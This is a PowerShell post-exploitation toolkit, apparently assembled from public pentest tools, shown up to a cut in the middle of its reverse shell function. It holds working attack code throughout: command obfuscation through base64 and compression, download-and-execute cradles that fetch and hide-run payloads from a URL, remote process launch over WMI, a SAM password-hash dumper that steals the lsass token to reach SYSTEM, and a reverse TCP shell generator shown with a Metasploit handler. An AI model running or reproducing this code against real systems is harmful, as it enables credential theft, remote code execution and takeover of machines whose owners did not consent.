
<#
.SYNOPSIS
   Converts a given PowerShell command string in to an Encoded Base64 command.
.DESCRIPTION
   Converts a given PowerShell command string in to an Encoded Base64 command.
.EXAMPLE
   Encoding a command
   PS C:\> ConvertTo-Base64Command -command "write-host 'hello world'"
   dwByAGkAdABlAC0AaABvAHMAdAAgACcAaABlAGwAbABvACAAdwBvAHIAbABkACcA

   PS C:\> powershell.exe -encodedcommand dwByAGkAdABlAC0AaABvAHMAdAAgACcAaABlAGwAbABvACAAdwBvAHIAbABkACcA
   hello world

#>
function ConvertTo-PostBase64Command
{
    [CmdletBinding()]
    Param
    (
        # Command to Encode
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ParameterSetName="command",
                   Position=0)]
        [String]$Command,

        # PowerShell Script to Encode
        [Parameter(Mandatory=$true,
                   ParameterSetName="file",
                   Position=0)]
        [ValidateScript({Test-Path $_})]
        [String]$File
    )

    Begin
    {
    }
    Process
    {
        switch ($PsCmdlet.ParameterSetName)
        {
            "command" {$contents = $Command}
            "file" {$contents =  [system.io.file]::ReadAllText($File)}
        }
        $bytes = [Text.Encoding]::Unicode.GetBytes($contents)
        $encodedCommand = [Convert]::ToBase64String($bytes)
        # If to long tell the user
        if ($encodedCommand.Length -gt 8100)
        {
            Write-Warning "Encoded command may be to long to run vian -EncodedCommand of Powershell.exe"
        }
    }
    End
    {
        $encodedCommand
    }
}


<#
.SYNOPSIS
   Will compress a script for use in Post-Exploitation with Powershell.exe
.DESCRIPTION
   Will compress a given script and return a command that can be used with PowerShell.exe -command <command>
#>
function Compress-PostScript
{
    [CmdletBinding()]
    Param
    (
        # Script file to compress.
        [Parameter(Mandatory=$true,
                  ValueFromPipeline=$true,
                  ParameterSetName="file",
                  Position=0)]
        [ValidateScript({Test-Path $_})]
		$File,

        # Command to Encode
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ParameterSetName="command",
                   Position=0)]
        [String]$Command
    )

    Begin
    {
    }
    Process
    {
         # Get Content of Script
        switch ($PsCmdlet.ParameterSetName)
        {
            "command" {$contents = $Command}
            "file" {$contents =  [system.io.file]::ReadAllText($File)}
        }

        # Compress Script
        $ms = New-Object IO.MemoryStream
        $action = [IO.Compression.CompressionMode]::Compress
        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
        $contents | ForEach-Object {$sw.WriteLine($_)}
        $sw.Close()

        # Base64 encode stream
        $code = [Convert]::ToBase64String($ms.ToArray())

        $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
        "`$(New-Object IO.Compression.DeflateStream (" +
        "`$(New-Object IO.MemoryStream (,"+
        "`$([Convert]::FromBase64String('$code')))), " +
        "[IO.Compression.CompressionMode]::Decompress)),"+
        " [Text.Encoding]::ASCII)).ReadToEnd();" 

        # If to long tell the user
        if ($command.Length -gt 8100)
        {
            Write-Warning "Compresses Script may be to long to run via -EncodedCommand of Powershell.exe"
        }
    }
    End
    {
        $command
    }
}


<#
.SYNOPSIS
   Generates an encoded command that will download a given PowerShell Script and execute it
   on a target system given to powershell.exe -encodedcommand <command>. 
.DESCRIPTION
   Generates an encoded command that will download a given PowerShell Script and execute it
   on a target system given to powershell.exe -encodedcommand <command>. 
#>
function New-PostDownloadExecuteScript
{
    [CmdletBinding()]
    Param
    (
        # Param1 help description
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [string]$Url
    )

    Begin
    {
    }
    Process
    {
        $scriptcode = "`$webClient = New-Object System.Net.WebClient;"+
            "`$proxy = [System.Net.WebRequest]::GetSystemWebProxy();"+
            "`$proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;"+
            "`$webClient.Proxy = `$proxy;"+
            "`$payload_url = '$Url';"+
            "Write-Host '$url';"+
            "`$command = `$webClient.DownloadString(`$payload_url);"+
            "Invoke-Expression `$command "

        
        $bytes = [Text.Encoding]::Unicode.GetBytes($scriptcode)
        $encodedCommand = [Convert]::ToBase64String($bytes)
    }
    End
    {
        $encodedCommand
    }
}


<#
.SYNOPSIS
   Generates an encoded command that will download a given Hex Byte Array String  and execute it
   on a target system given to powershell.exe -encodedcommand <command>. 
.DESCRIPTION
   Generates an encoded command that will download a given Hex Byte Array String  and execute it
   on a target system given to powershell.exe -encodedcommand <command>. 
#>
function New-PostDownloadExecutePE
{
    [CmdletBinding()]
    Param
    (
        # URL from where the encoded file will be downloaded from.
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        [string]$Url,

        # Path on target where the file will be decoded to and executed, default is the targets TEMP.
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$false,
                   Position=1)]
        [string]$Path = '$env:TEMP'
    )

    Begin
    {
        $rand = New-Object System.Random
        $PayName = $rand.Next()
    }
    Process
    {
        $part1 = "`$payload_url = `'$($Url)`'`n `$Path2exe = `'$($Path)`'`n `$payname = `'$($PayName)`'`n"
        $scriptcode = @'
$webClient = New-Object System.Net.WebClient
$payloadhex = $webClient.DownloadString($payload_url)
[Byte[]] $temp = $payloadhex -split ' '
[System.IO.File]::WriteAllBytes("$($Path2exe)\$($payname).exe", $temp)
Start-Process -FilePath "$($Path2exe)\$($payname).exe" -WindowStyle Hidden      
'@ 

        $ScriptCode = $part1 + $scriptcode
        $bytes = [Text.Encoding]::Unicode.GetBytes($ScriptCode)
        $encodedCommand = [Convert]::ToBase64String($bytes)
    }
    End
    {
        $encodedCommand
        #$scriptcode
    }
}


<#
.SYNOPSIS
   Executes a command on a remote host using WMI
.DESCRIPTION
   Executes a command on a remote host using WMI
#>
function Start-PostRemoteProcess
{
    [CmdletBinding()]
    Param
    (
        [parameter(ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true)]
        [string]$Computername="$env:COMPUTERNAME",

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [parameter(ValueFromPipeline=$true)]
        [string]$Command
    )

    Begin
    {
    }
    Process
    {
        $wmicmd = Get-WmiObject -List win32_process -ComputerName $Computername -Credential $Credential
        $wmicmd.Create($Command)  
    }
    End
    {
    }
}


<#
.SYNOPSIS
   Generate a command for dumping hashes from a Windows System Registry
.DESCRIPTION
  Generate a command for dumping hashes from a Windows System PowerShell.exe -command 
  Command must be executed as SYSTEM if ran as administrator it will privilage escalate to SYSTEM
  and execute a hashdump by reading the hashes from the registry.
.EXAMPLE
  $enc = Get-PostHashdumpScript
  C:\PS>powershell.exe -command $enc
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d4afe1d16ae931b74c59d7e1c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Carlos:1001:aad3b435b51404eeaad3b435b51404ee:62096e5ed83a10cf61cf79cc36738519:::
    HomeGroupUser$:1003:aad3b435b51404eeaad3b435b51404ee:951b271a4b7d1dd7a25e3d9c9f87341e:::


  Executes the compressed command generated by the function and dumps the windows hashes from the registry.
 
 .NOTES
   PowerDump script by Kathy Peters, Josh Kelley (winfang) and Dave Kennedy (ReL1K)
   Privilage Escalation from http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/05/use-powershell-to-duplicate-process-tokens-via-p-invoke.aspx

#>
function Get-PostHashdumpScript
{
    [CmdletBinding()]
    Param
    (
        [validateset("Encoded","Script")]
        [string]$Output = "Encoded"
    
    )

    $script = @'

$sign = @"
using System;
using System.Runtime.InteropServices;
public static class priv
{
    [DllImport("shell32.dll")]
    public static extern bool IsUserAnAdmin();
}

"@

    $adminasembly = Add-Type -TypeDefinition $sign -Language CSharp -PassThru

    function ElevatePrivs
    {
$signature = @" 
    [StructLayout(LayoutKind.Sequential, Pack = 1)] 
     public struct TokPriv1Luid 
     { 
         public int Count; 
         public long Luid; 
         public int Attr; 
     } 
 
    public const int SE_PRIVILEGE_ENABLED = 0x00000002; 
    public const int TOKEN_QUERY = 0x00000008; 
    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020; 
    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000; 
 
    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000; 
    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001; 
    public const UInt32 TOKEN_DUPLICATE = 0x0002; 
    public const UInt32 TOKEN_IMPERSONATE = 0x0004; 
    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010; 
    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040; 
    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080; 
    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100; 
    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY); 
    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | 
      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | 
      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | 
      TOKEN_ADJUST_SESSIONID); 
 
    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege"; 
    public const int ANYSIZE_ARRAY = 1; 
 
    [StructLayout(LayoutKind.Sequential)] 
    public struct LUID 
    { 
      public UInt32 LowPart; 
      public UInt32 HighPart; 
    } 
 
    [StructLayout(LayoutKind.Sequential)] 
    public struct LUID_AND_ATTRIBUTES { 
       public LUID Luid; 
       public UInt32 Attributes; 
    } 
 
 
    public struct TOKEN_PRIVILEGES { 
      public UInt32 PrivilegeCount; 
      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)] 
      public LUID_AND_ATTRIBUTES [] Privileges; 
    } 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int 
        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle); 
 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
    [return: MarshalAs(UnmanagedType.Bool)] 
    public static extern bool SetThreadToken( 
      IntPtr PHThread, 
      IntPtr Token 
    ); 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
     [return: MarshalAs(UnmanagedType.Bool)] 
      public static extern bool OpenProcessToken(IntPtr ProcessHandle,  
       UInt32 DesiredAccess, out IntPtr TokenHandle); 
 
    [DllImport("advapi32.dll", SetLastError = true)] 
    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid); 
 
    [DllImport("kernel32.dll", ExactSpelling = true)] 
    public static extern IntPtr GetCurrentProcess(); 
 
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, 
     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen); 
"@ 
 
          $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
          if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) { 
            Write-Warning "Run the Command as an Administrator" 
            Break 
          } 
 
          Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPriv 
          $adjPriv = [AdjPriv.AdjPriv] 
          [long]$luid = 0 
 
          $tokPriv1Luid = New-Object AdjPriv.AdjPriv+TokPriv1Luid 
          $tokPriv1Luid.Count = 1 
          $tokPriv1Luid.Luid = $luid 
          $tokPriv1Luid.Attr = [AdjPriv.AdjPriv]::SE_PRIVILEGE_ENABLED 
 
          $retVal = $adjPriv::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid) 
  
          [IntPtr]$htoken = [IntPtr]::Zero 
          $retVal = $adjPriv::OpenProcessToken($adjPriv::GetCurrentProcess(), [AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS, [ref]$htoken) 
   
   
          $tokenPrivileges = New-Object AdjPriv.AdjPriv+TOKEN_PRIVILEGES 
          $retVal = $adjPriv::AdjustTokenPrivileges($htoken, $false, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero) 
 
          if(-not($retVal)) { 
            [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
            Break 
          } 
 
          $process = (Get-Process -Name lsass) 
          #$process.name
          [IntPtr]$hlsasstoken = [IntPtr]::Zero 
          $retVal = $adjPriv::OpenProcessToken($process.Handle, ([AdjPriv.AdjPriv]::TOKEN_IMPERSONATE -BOR [AdjPriv.AdjPriv]::TOKEN_DUPLICATE), [ref]$hlsasstoken) 
 
          [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero 
          $retVal = $adjPriv::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle) 
  
          $retval = $adjPriv::SetThreadToken([IntPtr]::Zero, $dulicateTokenHandle) 
  
          if(-not($retVal)) { 
            [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
          } 
      }

      function LoadApi
        {
        $oldErrorAction = $global:ErrorActionPreference;
        $global:ErrorActionPreference = "SilentlyContinue";
        $test = [PowerDump.Native];
        $global:ErrorActionPreference = $oldErrorAction;
        if ($test) 
        {
            # already loaded
            return; 
        }

$code = @"
using System;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;

namespace PowerDump
{
    public class Native
    {
    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
     public static extern int RegOpenKeyEx(
        int hKey,
        string subKey,
        int ulOptions,
        int samDesired,
        out int hkResult);

    [DllImport("advapi32.dll", EntryPoint = "RegEnumKeyEx")]
    extern public static int RegEnumKeyEx(
        int hkey,
        int index,
        StringBuilder lpName,
        ref int lpcbName,
        int reserved,
        StringBuilder lpClass,
        ref int lpcbClass,
        out long lpftLastWriteTime);

    [DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    extern public static int RegQueryInfoKey(
        int hkey,
        StringBuilder lpClass,
        ref int lpcbClass,
        int lpReserved,
        out int lpcSubKeys,
        out int lpcbMaxSubKeyLen,
        out int lpcbMaxClassLen,
        out int lpcValues,
        out int lpcbMaxValueNameLen,
        out int lpcbMaxValueLen,
        out int lpcbSecurityDescriptor,
        IntPtr lpftLastWriteTime);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern int RegCloseKey(
        int hKey);

        }
    } // end namespace PowerDump

    public class Shift {
        public static int   Right(int x,   int count) { return x >> count; }
        public static uint  Right(uint x,  int count) { return x >> count; }
        public static long  Right(long x,  int count) { return x >> count; }
        public static ulong Right(ulong x, int count) { return x >> count; }
        public static int    Left(int x,   int count) { return x << count; }
        public static uint   Left(uint x,  int count) { return x << count; }
        public static long   Left(long x,  int count) { return x << count; }
        public static ulong  Left(ulong x, int count) { return x << count; }
    }
"@

           $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
           $dllName = [PsObject].Assembly.Location
           $compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
           $assemblies = @("System.dll", $dllName)
           $compilerParameters.ReferencedAssemblies.AddRange($assemblies)
           $compilerParameters.GenerateInMemory = $true
           $compilerResults = $provider.CompileAssemblyFromSource($compilerParameters, $code)
           if($compilerResults.Errors.Count -gt 0) {
             $compilerResults.Errors | % { Write-Error ("{0}:`t{1}" -f $_.Line,$_.ErrorText) }
           }

        }

        $antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
        $almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
        $empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
        $empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
        $odd_parity = @(
          1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
          16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
          32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
          49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
          64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
          81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
          97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
          112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
          128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
          145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
          161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
          176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
          193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
          208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
          224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
          241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
        );

        function sid_to_key($sid)
        {
            $s1 = @();
            $s1 += [char]($sid -band 0xFF);
            $s1 += [char]([Shift]::Right($sid,8) -band 0xFF);
            $s1 += [char]([Shift]::Right($sid,16) -band 0xFF);
            $s1 += [char]([Shift]::Right($sid,24) -band 0xFF);
            $s1 += $s1[0];
            $s1 += $s1[1];
            $s1 += $s1[2];
            $s2 = @();
            $s2 += $s1[3]; $s2 += $s1[0]; $s2 += $s1[1]; $s2 += $s1[2];
            $s2 += $s2[0]; $s2 += $s2[1]; $s2 += $s2[2];
            return ,((str_to_key $s1),(str_to_key $s2));
        }

        function str_to_key($s)
        {
            $key = @();
            $key += [Shift]::Right([int]($s[0]), 1 );
            $key += [Shift]::Left( $([int]($s[0]) -band 0x01), 6) -bor [Shift]::Right([int]($s[1]),2);
            $key += [Shift]::Left( $([int]($s[1]) -band 0x03), 5) -bor [Shift]::Right([int]($s[2]),3);
            $key += [Shift]::Left( $([int]($s[2]) -band 0x07), 4) -bor [Shift]::Right([int]($s[3]),4);
            $key += [Shift]::Left( $([int]($s[3]) -band 0x0F), 3) -bor [Shift]::Right([int]($s[4]),5);
            $key += [Shift]::Left( $([int]($s[4]) -band 0x1F), 2) -bor [Shift]::Right([int]($s[5]),6);
            $key += [Shift]::Left( $([int]($s[5]) -band 0x3F), 1) -bor [Shift]::Right([int]($s[6]),7);
            $key += $([int]($s[6]) -band 0x7F);
            0..7 | %{
                $key[$_] = [Shift]::Left($key[$_], 1);
                $key[$_] = $odd_parity[$key[$_]];
                }
            return ,$key;
        }

        function NewRC4([byte[]]$key)
        {
            return new-object Object |
            Add-Member NoteProperty key $key -PassThru |
            Add-Member NoteProperty S $null -PassThru |
            Add-Member ScriptMethod init {
                if (-not $this.S)
                {
                    [byte[]]$this.S = 0..255;
                    0..255 | % -begin{[long]$j=0;}{
                        $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                        $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                        }
                }
            } -PassThru |
            Add-Member ScriptMethod "encrypt" {
                $data = $args[0];
                $this.init();
                $outbuf = new-object byte[] $($data.Length);
                $S2 = $this.S[0..$this.S.Length];
                0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
                    $i = ($i+1) % $S2.Length;
                    $j = ($j + $S2[$i]) % $S2.Length;
                    $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
                    $a = $data[$_];
                    $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
                    $outbuf[$_] = ($a -bxor $b);
                }
                return ,$outbuf;
            } -PassThru
        }

        function des_encrypt([byte[]]$data, [byte[]]$key)
        {
            return ,(des_transform $data $key $true)
        }

        function des_decrypt([byte[]]$data, [byte[]]$key)
        {
            return ,(des_transform $data $key $false)
        }

        function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
        {
            $des = new-object Security.Cryptography.DESCryptoServiceProvider;
            $des.Mode = [Security.Cryptography.CipherMode]::ECB;
            $des.Padding = [Security.Cryptography.PaddingMode]::None;
            $des.Key = $key;
            $des.IV = $key;
            $transform = $null;
            if ($doEncrypt) {$transform = $des.CreateEncryptor();}
            else{$transform = $des.CreateDecryptor();}
            $result = $transform.TransformFinalBlock($data, 0, $data.Length);
            return ,$result;
        }

        function Get-RegKeyClass([string]$key, [string]$subkey)
        {
            switch ($Key) {
                "HKCR" { $nKey = 0x80000000} #HK Classes Root
                "HKCU" { $nKey = 0x80000001} #HK Current User
                "HKLM" { $nKey = 0x80000002} #HK Local Machine
                "HKU"  { $nKey = 0x80000003} #HK Users
                "HKCC" { $nKey = 0x80000005} #HK Current Config
                default { 
                    throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
                }
            }
            $KEYQUERYVALUE = 0x1;
            $KEYREAD = 0x19;
            $KEYALLACCESS = 0x3F;
            $result = "";
            [int]$hkey=0
            if (-not [PowerDump.Native]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
            {
    	        $classVal = New-Object Text.Stringbuilder 1024
    	        [int]$len = 1024
    	        if (-not [PowerDump.Native]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
    		        [ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
    	        {
    		        $result = $classVal.ToString()
    	        }
    	        else
    	        {
    		        Write-Error "RegQueryInfoKey failed";
    	        }	
    	        [PowerDump.Native]::RegCloseKey($hkey) | Out-Null
            }
            else
            {
    	        Write-Error "Cannot open key";
            }
            return $result;
        }

        function Get-BootKey
        {
            $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
            $b = new-object byte[] $($s.Length/2);
            0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
            $b2 = new-object byte[] 16;
            0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
            return ,$b2;
        }

        function Get-HBootKey
        {
            param([byte[]]$bootkey);
            $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
            $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
            $k = Get-Item HKLM:\SAM\SAM\Domains\Account;
            if (-not $k) {return $null}
            [byte[]]$F = $k.GetValue("F");
            if (-not $F) {return $null}
            $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
            $rc4 = NewRC4 $rc4key;
            return ,($rc4.encrypt($F[0x80..0x9F]));
        }

        function Get-UserName([byte[]]$V)
        {
            if (-not $V) {return $null};
            $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
            $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
            return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
        }

        function Get-UserHashes($u, [byte[]]$hbootkey)
        {
            [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
            if ($u.HashOffset + 0x28 -lt $u.V.Length)
            {
                $lm_hash_offset = $u.HashOffset + 4;
                $nt_hash_offset = $u.HashOffset + 8 + 0x10;
                $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
                $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
            }
            elseif ($u.HashOffset + 0x14 -lt $u.V.Length)
            {
                $nt_hash_offset = $u.HashOffset + 8;
                $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
            }
            return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
        }

        function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
        {
            [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
            # LM Hash
            if ($enc_lm_hash)
            {    
                $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
            }
    
            # NT Hash
            if ($enc_nt_hash)
            {
                $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
            }

            return ,($lmhash,$nthash)
        }

        function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
        {
            $deskeys = sid_to_key $rid;
            $md5 = [Security.Cryptography.MD5]::Create();
            $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
            $rc4 = NewRC4 $rc4_key;
            $obfkey = $rc4.encrypt($enc_hash);
            $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) + 
                (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
            return ,$hash;
        }

        function Get-UserKeys
        {
            ls HKLM:\SAM\SAM\Domains\Account\Users | 
                where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} | 
                    Add-Member AliasProperty KeyName PSChildName -PassThru |
                    Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
                    Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
                    Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
                    Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
        }

        function DumpHashes
        {
            LoadApi
            $bootkey = Get-BootKey;
            $hbootKey = Get-HBootKey $bootkey;
            Get-UserKeys | %{
                $hashes = Get-UserHashes $_ $hBootKey;
                "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid, 
                    [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(), 
                    [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
            }
        }

        if ([priv]::IsUserAnAdmin())
        {
            if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
            {
                DumpHashes
            }
            else
            {
                ElevatePrivs
                if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
                {
                    DumpHashes
                }
            }
        }
        else
        {
            Write-Error "Administrator or System privelages necessary."
        }

'@
    switch ($Output)
    {
        'Encoded' {Compress-PostScript -Command $script}
        'Script' {$script}
    }
    

}


<#
.SYNOPSIS
   Generates an encoded command to create a Reverse TCP Shell
.DESCRIPTION
   Generates an encoded command to create a Reverse TCP Shell given and IP and Port for a listenning connection.
.EXAMPLE

   -------- Attacker --------

   PS C:\> $enc = Get-PostReverShell -LHOST 192.168.1.104 -LPORT 4444
   PS C:\> Start-PostRemoteProcess -Computername 192.168.1.80 -Credential (Get-Credential) -Command "powershell.exe -encodedcommand $enc"
    cmdlet Get-Credential at command pipeline position 1
    Supply values for the following parameters:


    __GENUS          : 2
    __CLASS          : __PARAMETERS
    __SUPERCLASS     : 
    __DYNASTY        : __PARAMETERS
    __RELPATH        : 
    __PROPERTY_COUNT : 2
    __DERIVATION     : {}
    __SERVER         : 
    __NAMESPACE      : 
    __PATH           : 
    ProcessId        : 3052
    ReturnValue      : 0
    PSComputerName   : 

   -------- Metasploit --------

    msf> use exploit/multi/handler 
    msf exploit(handler) > set LHOST 192.168.1.104
    LHOST => 192.168.1.104
    msf exploit(handler) > set LPORT 4444
    LPORT => 4444
    msf exploit(handler) > set ExitOnSession false
    ExitOnSession => false
    msf exploit(handler) > exploit -j
    [*] Exploit running as background job.

    [-] Handler failed to bind to 192.168.1.104:4444
    [*] Started reverse handler on 0.0.0.0:4444 
    msf exploit(handler) > [*] Starting the payload handler...
    [*] Command shell session 1 opened (192.168.1.104:4444 -> 192.168.1.80:54137) at 2013-06-03 20:36:29 -0400

.NOTES
    Reverseshell script is from the Social Engineeting Toolkit https://github.com/trustedsec/social-engineer-toolkit
    http://www.trustsec.com

#>
function Get-PostReverTCPShell
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0)]
        $LHOST,

        [Parameter(Mandatory=$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=1)]
        [int]
        $LPORT,

        [validateset("Encoded","Script")]
        [string]$Output = "Encoded"
    )

    Begin
    {
    }
    Process
    {
        $part1 = "`$address =`'$LHOST`'; `$port = `'$LPORT`';`n"
        $part2 = @'
function cleanup {
if ($client.Connected -eq $true) {$client.Close()}
if ($process.ExitCode -ne $null) {$process.Close()}
exit}
$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = $env:ComSpec
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
